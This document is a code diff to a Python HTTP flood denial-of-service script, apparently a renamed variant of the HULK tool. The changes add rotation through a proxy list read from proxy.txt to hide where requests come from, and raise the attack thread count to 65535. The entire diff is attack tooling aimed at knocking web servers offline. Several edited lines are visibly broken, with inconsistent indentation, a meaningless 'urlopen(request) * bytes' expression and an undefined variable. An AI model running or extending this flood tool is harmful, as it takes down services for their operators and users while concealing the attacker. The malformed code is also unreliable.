@@ -22,7 +22,9 @@ headers_referers=[]
 request_counter=0
 flag=0
 safe=0
-
+F = open('proxy.txt')
+ips = F.read().split('\n')
+F.close()
 def inc_counter():
 	global request_counter
 	request_counter+=1
@@ -71,7 +73,7 @@ def buildblock(size):
 
 def usage():
 	print('---------------------------------------------------')
-	print('USAGE: python hulk.py <url>')
+	print('USAGE: python thog.py <url>')
 	print('you can add "safe" after url, to autoshut after dos')
 	print('---------------------------------------------------')
 
@@ -90,19 +92,29 @@ def httpcall(url):
 	request.add_header('Host',host)
 	request.get_method = lambda: "POST"
 	bytes = 65535
-	try:
-			urllib2.urlopen(request)
-	except socket.error as e:
-			#print e.code
+	for n in range(1, 9999):
+		if n % 10 == 0:
 			
+	               #print 'size: '+str(len(ips))+'\n'
+	               index = random.randint(0,len(ips)-1)
+	               #print 'http:'+ips[index];
+	               proxy = urllib2.ProxyHandler({'http':ips[index]})#proxy = urllib2.ProxyHandler({'http':random.choice(ips)})
+	               opener = urllib2.build_opener(proxy,urllib2.HTTPHandler)
+	               urllib2.install_opener(opener)
+	               try:
+		              if n % 10 == 0:
+			      urllib2.urlopen(request) * bytes
+	               except socket.error as e:
+			      #print e.code
+			 
 		
-			code=500
+			      code=500
 	
-			print "500 Internal Server Error..."
-	else:
-			inc_counter()
-			urllib2.urlopen(request)
-	return(code)		
+			      print "500 Internal Server Error..."
+	                else:
+			      inc_counter()
+			      urllib2.urlopen(request)
+	                return(code)		
 
 
 #http caller thread 
@@ -127,7 +139,7 @@ class MonitorThread(threading.Thread):
 		while True:
 			
 
-			print "Rps: %d" % bytes++
+			print "Rps: %d" % bytes
 
 #execute 
 if len(sys.argv) < 2:
@@ -147,7 +159,7 @@ else:
 			url = url + "/"
 		m = re.search('(https?\://)?([^/]*)/?.*', url)
 		host = m.group(2)
-		for i in range(900):
+		for i in xrange(bytes):
                         
 			t = HTTPThread()
 			t.start()
